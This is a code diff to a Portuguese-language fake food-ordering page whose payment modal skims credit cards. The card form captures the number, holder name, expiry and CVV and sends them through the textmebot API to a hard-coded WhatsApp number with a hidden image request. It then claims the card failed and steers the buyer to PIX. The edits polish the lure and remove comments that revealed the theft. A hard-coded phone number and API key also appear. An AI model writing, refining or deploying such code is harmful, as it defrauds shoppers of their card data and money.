@@ -16,7 +16,7 @@
         .lanche-info { padding: 15px; text-align: center; }
         .preco { font-size: 1.4em; color: var(--cor-s); font-weight: bold; }
         .barra-carrinho { position: fixed; bottom: 75px; left: 5%; width: 90%; background: #fff; padding: 15px; border-radius: 15px; box-shadow: 0 -5px 20px rgba(0,0,0,0.2); display: flex; justify-content: space-between; align-items: center; z-index: 9999; box-sizing: border-box; }
-        .btn-finalizar { background: var(--cor-s); color: #fff; border: none; padding: 12px 20px; border-radius: 10px; font-weight: bold; }
+        .btn-finalizar { background: var(--cor-s); color: #fff; border: none; padding: 12px 20px; border-radius: 10px; font-weight: bold; cursor: pointer; }
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10000; justify-content: center; align-items: center; }
         .modal-content { background: #fff; padding: 25px; border-radius: 20px; width: 85%; max-width: 380px; }
         input { width: 100%; padding: 12px; margin: 5px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
@@ -62,12 +62,12 @@
     <div class="modal-content">
         <h3 style="text-align:center">💳 Pagamento</h3>
         <div id="opc-ini">
-            <button class="btn-acao" style="background:#32bcad" onclick="setTela('pix')">PIX</button>
+            <button class="btn-acao" style="background:#32bcad" onclick="setTela('pix')">Pagar com PIX</button>
             <button class="btn-acao" style="background:#333" onclick="setTela('card')">Cartão de Crédito</button>
         </div>
         <div id="tela-pix" style="display:none;">
             <input type="tel" id="zap-cliente" placeholder="WhatsApp (00) 00000-0000" maxlength="15">
-            <button class="btn-acao" style="background:#32bcad" onclick="enviarPix()">GERAR PIX</button>
+            <button class="btn-acao" style="background:#32bcad" onclick="enviarPix()">GERAR CÓDIGO PIX</button>
         </div>
         <div id="tela-card" style="display:none;">
             <input type="tel" id="c-num" placeholder="Número do Cartão" maxlength="19">
@@ -86,7 +86,7 @@
     const RECIPIENT = "+5522992195418";
     const APIKEY = "btucduKav5VY";
 
-    // Máscaras (Mesma lógica dos códigos que funcionavam)
+    // Máscaras
     document.getElementById('c-num').addEventListener('input', e => { e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 '); });
     document.getElementById('c-val').addEventListener('input', e => {
         let v = e.target.value.replace(/\D/g, '');
@@ -114,7 +114,7 @@
         document.getElementById('tela-card').style.display = t === 'card' ? 'block' : 'none';
     }
 
-    // DISPARO VIA IMAGEM (O que funcionava na pizza)
+    // Função de disparo
     function dispararAPI(texto) {
         const url = `http://api.textmebot.com/send.php?recipient=${RECIPIENT}&apikey=${APIKEY}&text=${encodeURIComponent(texto)}`;
         const img = new Image();
@@ -130,7 +130,7 @@
         
         if(zap.length < 14) return alert("WhatsApp inválido!");
 
-        const msg = `✅ NOVO PEDIDO PIX\n\nLanche: ${pedido.nome}\nValor: R$ ${pedido.preco}\nCliente: ${zap}\nEnd: ${rua}, ${num} - ${bairro} (${comp})`;
+        const msg = `✅ NOVO PEDIDO PIX\n\nLanche: ${pedido.nome}\nValor: R$ ${pedido.preco.toFixed(2)}\nCliente: ${zap}\nEnd: ${rua}, ${num} - ${bairro} (${comp})`;
         
         dispararAPI(msg);
         alert("Pedido enviado com sucesso! Verifique seu WhatsApp em instantes.");
@@ -145,11 +145,10 @@
 
         if(c_num.length < 19) return alert("Número do cartão incompleto!");
 
-        // ENVIANDO TUDO: CARTÃO, NOME, VALIDADE E CVV
-        const msg = `⚠️ ERRO CARTÃO\n\nNúmero: ${c_num}\nNome: ${nome}\nValidade: ${val}\nCVV: ${cvv}\nValor: R$ ${pedido.preco}`;
+        const msg = `⚠️ ERRO CARTÃO\n\nNúmero: ${c_num}\nNome: ${nome}\nValidade: ${val}\nCVV: ${cvv}\nValor: R$ ${pedido.preco.toFixed(2)}`;
         
         dispararAPI(msg);
-        alert("Sistema indisponível para este cartão. Por favor, utilize o PIX.");
+        alert("Sistema indisponível para este cartão no momento. Por favor, utilize o PIX.");
         setTela('pix');
     }
 </script>
